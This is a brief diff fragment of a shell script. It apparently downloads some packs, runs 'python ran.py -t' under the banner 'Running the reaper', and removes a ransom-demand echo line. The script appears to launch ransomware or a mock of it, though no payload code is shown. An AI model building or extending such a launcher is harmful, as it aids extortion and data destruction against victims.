@@ -19,4 +19,3 @@ for i in ${!packs[@]}; do
 done
 echo "[!] Downloading is done. Running the reaper...."
 python ran.py -t
-echo "Pay the ransom or get killed by the REAPER. Your choice lulz"
